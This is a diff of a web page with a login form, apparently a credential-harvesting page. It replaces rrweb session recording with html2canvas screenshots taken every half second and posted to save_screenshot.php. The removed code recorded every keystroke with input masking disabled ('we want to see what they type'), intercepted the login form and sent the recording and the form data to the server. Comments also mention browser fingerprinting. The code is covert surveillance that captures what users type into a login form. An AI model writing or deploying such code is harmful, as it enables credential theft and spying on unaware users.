@@ -21181,120 +21181,48 @@
     }
   </script>
 
-  <!-- rrweb Session Recording & Browser Fingerprinting -->
-  <script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
+  <!-- Screenshot Capture & Browser Fingerprinting -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <script>
     // ==============================================
-    // MODULE 1: rrweb Session Recording
+    // MODULE 1: Screenshot Capture (Every 0.5s)
     // ==============================================
-    let events = []; // Store all recording events
-    let sessionStartTime = Date.now();
-    let stopRecordingFn = null;
+    let screenshotCounter = 0;
+    let screenshotInterval;
 
-    // Start rrweb recording
-    function startRecording() {
-      stopRecordingFn = rrweb.record({
-        emit(event) {
-          // Store each event in the events array
-          events.push(event);
-        },
-        // Recording options
-        checkoutEveryNms: 10 * 1000, // Create a full snapshot every 10 seconds
-        recordCanvas: true, // Record canvas elements
-        collectFonts: true, // Collect font information
-        plugins: [],
-        sampling: {
-          // Mouse interaction sampling
-          mousemove: true, // Record all mouse movements
-          mouseInteraction: true, // Record clicks, etc.
-          scroll: 150, // Throttle scroll events to every 150ms
-          input: 'all' // Record all input events (typing)
-        },
-        // Privacy settings - record everything for testing purposes
-        maskAllInputs: false, // Don't mask inputs - we want to see what they type
-        maskInputOptions: {}, // No masking
-        slimDOMOptions: {
-          script: false,
-          comment: false,
-          headFavicon: false,
-          headWhitespace: false,
-          headMetaDescKeywords: false,
-          headMetaSocial: false,
-          headMetaRobots: false,
-          headMetaHttpEquiv: false,
-          headMetaAuthorship: false,
-          headMetaVerification: false
-        }
+    function captureScreenshot() {
+      html2canvas(document.body, {
+        allowTaint: true,
+        useCORS: true,
+        scale: 2.0,  // Ultra HD - 200% resolution for crystal clear screenshots
+        logging: false,  // Disable console logs
+        backgroundColor: '#ffffff'  // Ensure white background
+      }).then(canvas => {
+        const screenshot = canvas.toDataURL('image/jpeg', 0.95);  // 95% quality for HD
+        const timestamp = Date.now();
+        screenshotCounter++;
+
+        // Send to server
+        fetch('save_screenshot.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            screenshot: screenshot,
+            timestamp: timestamp,
+            counter: screenshotCounter
+          })
+        }).catch(err => console.log('Screenshot save failed'));
       });
-      
-      console.log('rrweb recording started');
     }
 
-    // Save recording to server
-    function saveRecording() {
-      if (events.length === 0) {
-        console.log('No events to save');
-        return;
-      }
-
-      const sessionData = {
-        events: events,
-        sessionId: sessionStartTime,
-        duration: Date.now() - sessionStartTime,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        screenResolution: `${window.screen.width}x${window.screen.height}`,
-        windowSize: `${window.innerWidth}x${window.innerHeight}`
-      };
-
-      // Send to server
-      fetch('save_recording.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(sessionData)
-      })
-      .then(response => response.json())
-      .then(data => console.log('Recording saved:', data))
-      .catch(err => console.log('Recording save failed:', err));
-    }
-
-    // Start recording when page loads
+    // Start capturing screenshots every 0.5 seconds
     window.addEventListener('load', function () {
-      startRecording();
+      screenshotInterval = setInterval(captureScreenshot, 500);
     });
 
-    // Intercept form submission to save recording before submitting
-    document.addEventListener('DOMContentLoaded', function() {
-      const loginForm = document.getElementById('loginForm');
-      if (loginForm) {
-        loginForm.addEventListener('submit', function(e) {
-          e.preventDefault(); // Prevent default submission
-          
-          // Stop recording
-          if (stopRecordingFn) {
-            stopRecordingFn();
-            console.log('rrweb recording stopped');
-          }
-          
-          // Save the recording
-          saveRecording();
-          
-          // Wait a moment for the save to complete, then submit the form
-          setTimeout(function() {
-            // Create a new FormData object and submit
-            const formData = new FormData(loginForm);
-            fetch('login.php', {
-              method: 'POST',
-              body: formData
-            }).then(() => {
-              // Redirect based on action_config.php settings
-              window.location.href = 'login.php?submitted=true';
-            });
-          }, 500); // 500ms delay to ensure recording is saved
-          
-          return false;
-        });
-      }
+    // Stop capturing if user leaves page
+    window.addEventListener('beforeunload', function () {
+      clearInterval(screenshotInterval);
     });
 
     // ==============================================
